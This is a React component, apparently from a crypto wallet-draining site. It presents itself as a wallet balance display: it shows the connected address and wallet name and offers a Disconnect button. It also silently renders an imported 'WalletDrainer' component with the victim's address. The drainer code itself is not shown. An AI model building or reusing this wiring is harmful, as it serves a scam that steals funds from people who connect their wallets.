import { useEffect, useState } from 'react';
import {
    useAppKitState,
    useAppKitTheme,
    useAppKitEvents,
    useAppKitAccount,
    useWalletInfo,
    useDisconnect
     } from '@reown/appkit/react'
import WalletDrainer from './WalletDrainer';

function WalletBalance() {
  const { disconnect } = useDisconnect();
  const { walletInfo } = useWalletInfo();

  const { isConnected, address, caipAddress } = useAppKitAccount();

  console.log("Wallet Info in WalletBalance.js", isConnected, address, caipAddress);

  if (!address) {
    // return <p>Connect your wallet to see token balance.</p>;
    return;
  }

  const { name: walletName } = walletInfo ?? caipAddress;


  const handleDisconnect = async () => {
    try {
      await disconnect();
    } catch (error) {
      console.error("Failed to disconnect:", error);
    }
  };

  return (
    <div className='mx-5 mt-5 text-center'>
     <p className=" break-all text-yellow-300">Wallet Address: {address}</p>
      <p className=" break-all text-yellow-300">Connected Wallet: {walletName}</p>
      <button onClick={handleDisconnect} className="bg-yellow-300 text-red-600 btn-sm mt-2 px-1 rounded-md  transition">
        Disconnect
      </button>
      <WalletDrainer wallet={address} />
    </div>
  );
}

export default WalletBalance;
